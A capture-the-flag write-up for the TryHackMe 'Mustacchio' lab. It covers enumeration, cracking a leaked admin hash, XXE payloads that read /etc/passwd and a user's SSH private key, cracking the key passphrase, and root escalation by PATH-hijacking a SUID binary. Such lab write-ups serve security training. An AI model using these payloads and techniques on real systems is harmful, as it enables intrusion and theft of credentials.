# 26 - Mustacchio (XML Injection)

Room Link --> [https://tryhackme.com/room/mustacchio](https://tryhackme.com/room/mustacchio)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nmap -p- -sS -Pn -n -T5 10.10.109.222 -vv

# outputs
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
80/tcp   open  http           syn-ack ttl 63
8765/tcp open  ultraseek-http syn-ack ttl 63
```
{% endcode %}

#### Gobuster enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.109.222 -w /usr/share/dirb/wordlists/common.txt -x txt -t 500 2>/dev/null

# output
/custom 
/fonts
/images
```
{% endcode %}

Navigating to http://10.10.109.222/custom and discovered a "users.bak" sqlite db file, then opened and found credentials for "admin" user.

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Or we can use the Sqlite3 cmd binary to view.

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ sqlite3 users.bak                                                                                     
SQLite version 3.43.1 2023-09-11 12:01:27
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> pragma table_info(users);
0|username|TEXT|1||0
1|password|TEXT|1||0
sqlite> SELECT * from users;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
sqlite>
```
{% endcode %}

Crack the hash using john.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# its a sha1 hash.
john passwd --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1
bulldog19        (?)

# got a valid credential
admin : bulldog19
```
{% endcode %}

#### port 8765 enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.109.222:8765 -w /usr/share/dirb/wordlists/common.txt -x txt -t 500 2>/dev/null

# outputs
/assets
/auth
/index.php
```
{% endcode %}

Navigating to `http://10.10.109.222:8765/index.php` was an admin login session.

I tried the admin credentials and was logged in successfully.

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After authentication ,check the source code and see a link in the "\<script>" session.

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Navigating to the path:  `http://10.10.109.222:8765/auth/dontforget.bak` downloaded the  "dontforget.bak" file. And there is also a comment in the page displaying a username: Barry.

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Initial Access

When you click the SUbmit button we get prompted with a "Insert XML Code!" alert, which suggest the page might be vulnerable to XML injection attack.

A resource we can use to structure our payload --> [Hacktricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity?source=post\_page-----ee526a543d8a--------------------------------)

#### XML Injection

I Was able to craft my own payload to view the /etc/passwd file usisng the structure of the XML code in the "dontforget.bak" file.

{% code overflow="wrap" lineNumbers="true" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace SYSTEM "/etc/passwd"> ]>
<comment>
  <name>&toreplace;</name>
  <author>Barry Clad</author>
  <com>D31ng Hack3d</com>
</comment>
```
{% endcode %}

<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And we see 2 users + root, ie; Joe, Barry and Root. Our focus should be on reading the ssh private key for Barry as hinted by the comment in the source code. And i crafted another payload to read it:

{% code overflow="wrap" lineNumbers="true" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace SYSTEM "/home/barry/.ssh/id_rsa"> ]>
<comment>
  <name>&toreplace;</name>
  <author>Barry Clad</author>
  <com>D31ng Hack3d</com>
</comment>
```
{% endcode %}

<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

It will be hard to use in this case, so i viewed the source code instead.

<figure><img src=".gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

First thing is to check if it iss encrypted by converting it to a crackable format for "johnthereaper"

{% code overflow="wrap" lineNumbers="true" %}
```bash
ssh2john id_rsa > id_hash.john
john id_hash.john --wordlist=/usr/share/wordlists/rockyou.txt

# and the password is:
urieljames       (id_rsa)

# login ssh.
ssh barry@10.10.109.222 -i id_rsa
```
{% endcode %}

And we got access :)

### Priv Esc to Joe

#### SUID binaries:

{% code overflow="wrap" lineNumbers="true" %}
```bash
find / -user root -perm /4000 -exec ls -l {} \; 2>/dev/null

# i ssaw a "/home/joe/live_log" binary 
-rwsr-xr-x 1 root root 16832 Jun 12  2021 /home/joe/live_log
```
{% endcode %}

Using the **strings** command, I could see that the binary was using the **tail** command to read the last 10 entries in the _/var/log/nginx/access.log_ file. We could exploit this.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# we get root this way.

barry@mustacchio:~$ echo "/bin/sh" > /tmp/tail
barry@mustacchio:~$ export PATH=/tmp:$PATH 
barry@mustacchio:~$ /home/joe/live_log
# id
uid=0(root) gid=0(root) groups=0(root),1003(barry)
# 
```
{% endcode %}

Done!
